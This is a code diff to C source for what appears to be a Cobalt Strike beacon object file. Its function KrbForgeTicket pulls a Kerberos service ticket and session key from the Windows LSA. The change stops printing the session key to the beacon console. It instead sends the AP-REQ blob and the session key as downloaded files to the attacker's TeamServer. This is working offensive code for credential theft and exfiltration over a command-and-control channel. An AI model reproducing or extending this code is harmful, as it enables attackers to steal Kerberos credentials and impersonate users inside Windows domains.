@@ -38,11 +38,11 @@ typedef struct
  * Purpose:
  *
  * Forges a ticket to the DC using the specified 
- * encryption algorithm. Returns a pointer to the
- * AP-REP blob and the session key.
+ * encryption algorithm. Downloads the Key and
+ * APREQ to a file on TeamServer.
  *
 !*/
-BOOL KrbForgeTicket( _In_ PWCHAR ServicePrincipalName, _In_ ULONG EncryptionType, _In_ PVOID* Req, _In_ PULONG ReqLen, _In_ PVOID* Key, _In_ PULONG KeyLen )
+BOOL KrbForgeTicket( _In_ PWCHAR ServicePrincipalName, _In_ ULONG EncryptionType, _In_ PCHAR ApReqFileName, _In_ PCHAR KeyFileName )
 {
 	API				Api;
 	SecBuffer			Buf;
@@ -63,7 +63,6 @@ BOOL KrbForgeTicket( _In_ PWCHAR ServicePrincipalName, _In_ ULONG EncryptionType
 	HANDLE				Ntl = NULL;
 	HANDLE				Lsa = NULL;
 	HANDLE				S32 = NULL;
-	PBUFFER				Out = NULL;
 	PKERB_RETRIEVE_TKT_REQUEST	Rtq = NULL;
 	PKERB_RETRIEVE_TKT_RESPONSE	Rta = NULL;
 
@@ -144,24 +143,15 @@ BOOL KrbForgeTicket( _In_ PWCHAR ServicePrincipalName, _In_ ULONG EncryptionType
 									/* Retrieve the KERBEROS_RETRIEVE_TKT_RESPONSE */
 									if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Rtq, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Uni.MaximumLength, &Rta, &RLn, &Nst ) ) ) {
 										if ( NT_SUCCESS( Nst ) ) {
-											if ( ( Out = BufferCreate() ) != NULL ) {
 
-												/* Print our current session key */
-												BufferPrintf( Out, "Kerberos Session Key:\n" );
-												for ( INT Idx = 0 ; Idx < Rta->Ticket.SessionKey.Length ; ++Idx ) {
-													BufferPrintf( Out, "%02X", ( ( PBYTE ) Rta->Ticket.SessionKey.Value ) [ Idx ] );
-												};
+											/* Download the APREQ to a file */
+											BeaconDownload( Buf.pvBuffer, Buf.cbBuffer, ApReqFileName );
 
-												/* Print back to beacon */
-												BeaconOutput( CALLBACK_OUTPUT, Out->Buffer, Out->Length );
+											/* Download session key to a filename */
+											BeaconDownload( Rta->Ticket.SessionKey.Value, Rta->Ticket.SessionKey.Length, KeyFileName );
 
-												/* Status */
-												Ret = TRUE;
-
-												/* Free the memory from the output buffer */
-												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
-												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
-											};
+											/* Status */
+											Ret = TRUE;
 										};
 										Api.LsaFreeReturnBuffer( Rta );
 									};
